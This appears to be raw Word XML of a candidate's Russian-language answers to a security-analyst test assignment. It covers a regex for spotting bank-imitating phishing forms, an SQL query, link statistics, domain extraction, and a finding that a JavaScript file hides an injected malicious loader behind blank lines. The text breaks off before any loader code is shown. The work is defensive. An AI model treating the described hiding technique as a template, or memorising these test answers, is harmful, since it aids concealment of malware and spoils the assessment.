        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(?:(?!&lt;/form&gt;).)*?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="00196582" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;select\b[^&gt;]*\bname\s*=\s*["']</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(?:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00196582">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>region_caisse|bobiz)["']</w:t>
      </w:r>
      <w:r w:rsidR="00E91E50">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Флаг </w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> позволяет не учитывать регистр, </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — искать через переносы строк, </w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — удобно разбить выражение на строки. Проверки внутри открывающего тега </w:t>
      </w:r>
      <w:r>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> допускают разный порядок </w:t>
      </w:r>
      <w:r>
        <w:t>method</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:t>action</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. Часть до </w:t>
      </w:r>
      <w:r>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> не даёт выйти за закрывающий тег этой формы.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В </w:t>
      </w:r>
      <w:r>
        <w:t>clean</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> такой же заголовок, поэтому проверка только названия банка дала бы ложное срабатывание. В нём другая форма: </w:t>
      </w:r>
      <w:r>
        <w:t>action</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>="./</w:t>
      </w:r>
      <w:r>
        <w:t>system</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>send</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>login</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>". Проверку названия банка, обработчика формы и полей нужно выполнять вместе.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Важный момент: в трёх фишинговых образцах виден этап выбора региона. Полей пароля в них нет. </w:t>
      </w:r>
      <w:r>
        <w:t>submit</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — обработчик отправки данных, но его исходный код не приложен. Поэтому нельзя </w:t>
      </w:r>
      <w:r w:rsidR="00196582">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>сказать</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>, что эти файлы уже показывают кражу пароля.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Проверка выполнена на всех четырёх файлах. Код проверки находится в </w:t>
      </w:r>
      <w:r>
        <w:t>task</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r>
        <w:t>py</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. 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br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Задание 3 </w:t>
      </w:r>
      <w:r>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> запрос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Для названия организации нужны </w:t>
      </w:r>
      <w:r>
        <w:t>label</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 4 и </w:t>
      </w:r>
      <w:r>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 9. Это видно из строки, где </w:t>
      </w:r>
      <w:r>
        <w:t>val</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 954 соответствует </w:t>
      </w:r>
      <w:r>
        <w:t>Microsoft</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>. Важно отобрать оба значения, иначе в результат могут попасть другие атрибуты, например числа 140 или 1627.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00E91E50">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SELECT DISTINCT u.id, u.url, v.value AS org_name</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FROM ap_urls AS u</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>JOIN ap_lbl2url AS lu ON lu.url_id = u.id</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>JOIN ap_lbl_attr_val AS lav ON lav.id = lu.lav_id</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>JOIN ap_vals AS v ON v.id = lav.val_id</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>WHERE lav.label_id = 4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  AND lav.attr_id = 9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="004368E0" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004368E0">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ORDER BY u.id, org_name;</w:t>
      </w:r>
      <w:r w:rsidR="00E91E50">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Сначала </w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>urls</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> соединяется с </w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>lbl</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> по </w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> ссылки. Затем </w:t>
      </w:r>
      <w:r>
        <w:t>lav</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> связывается с </w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> из </w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>lbl</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>attr</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>val</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. По </w:t>
      </w:r>
      <w:r>
        <w:t>val</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> из этой таблицы находится текстовое значение в </w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>vals</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t>DISTINCT</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> убирает повторения одной и той же пары «ссылка — организация».</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 4 Анализ ссылок</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRPr="00EC1513" w:rsidRDefault="00EC1513" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC1513">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Для выполнения задания я использовал Excel. Сначала преобразовал дату и время из текста в формат даты Excel. Затем создал отдельные столбцы с календарным днём и минутой суток.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRPr="00EC1513" w:rsidRDefault="00EC1513" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC1513">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>В файле находится 30 192 ссылки из 25 источников. Для каждого источника я подсчитал количество ссылок и его долю от общего числа. Менее 1% ссылок пришло из 18 источников.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRPr="00EC1513" w:rsidRDefault="00EC1513" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC1513">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Далее я построил сводную таблицу количества ссылок по дням. Больше всего ссылок пришло 5 марта — 1 983, меньше всего 6 марта — 313.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRDefault="00EC1513" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC1513">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Для графика я объединил записи за все дни по времени в формате ЧЧ:ММ. Получилось 1 440 минут суток. Для каждой минуты подсчитал количество ссылок, включая нулевые значения. Самый высокий пик приходится на 02:02 — 363 ссылки.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC1513" w:rsidRDefault="00EC1513" w:rsidP="00EC1513">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000" w:rsidP="00EC1513">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 5 Обработка доменов</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Для выполнения задания я использовал Python. Исходный файл domains.txt был заранее скачан и помещён в одну папку со скриптом. Программа читает его построчно, обрабатывает домены и сохраняет результат в таблицу.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Сначала программа убирает пробелы и переносы строк по краям каждой записи. Пустые строки и комментарии пропускаются. Затем удаляются все записи, которые начинаются с www. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Для выделения основного домена я использовал библиотеку tldextract со встроенным списком публичных доменных суффиксов. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Результат сохраняется в двух форматах: XLS и CSV. Это сделано потому, что в условии указан XLS, но также требуется разделение колонок запятыми, которое относится к CSV. В обоих файлах находятся две колонки:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>original_domain — исходное доменное имя после удаления служебных символов;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002A23AF" w:rsidRPr="002A23AF" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FD647A">
        <w:t>second</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD647A">
        <w:t>level</w:t>
      </w:r>
      <w:r w:rsidRPr="00E91E50">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r w:rsidRPr="00FD647A">
        <w:t>domain</w:t>
      </w:r>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> — выделенный регистрируемый домен.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="002A23AF" w:rsidP="002A23AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A23AF">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>К решению приложены скрипт 1.py и файлы domains_result.csv и domains_result.xls.</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Задание 6 Поиск подозрительного кода</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="009D74D2" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Папка 2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="008F673F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Вердикт: есть признаки внедрения вредоносного загрузчика. Подозрительный код находится в </w:t>
      </w:r>
      <w:r>
        <w:t>apiajax</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_113069.</w:t>
      </w:r>
      <w:r>
        <w:t>js</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_, строка 505. Этот файл подключается в _</w:t>
      </w:r>
      <w:r>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>_, строка 39.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="008F673F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D74D2">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>В начале файла много пустых строк, а в конце находится длинная строка</w:t>
      </w:r>
      <w:r w:rsidR="008F673F">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0076625D" w:rsidRPr="008F673F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
